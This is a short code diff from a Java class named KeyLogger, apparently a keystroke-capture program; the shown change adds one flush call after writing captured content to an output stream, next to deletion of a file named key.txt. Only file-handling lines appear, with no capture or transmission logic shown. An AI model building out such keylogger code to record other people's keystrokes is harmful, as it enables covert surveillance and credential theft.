@@ -105,6 +105,7 @@ public class KeyLogger implements NativeKeyListener {
 	  	File file= new File("D:\\key.txt");
     	file.delete();
 		oos.writeObject(content);
+		oos.flush();
 	}
 	
 }
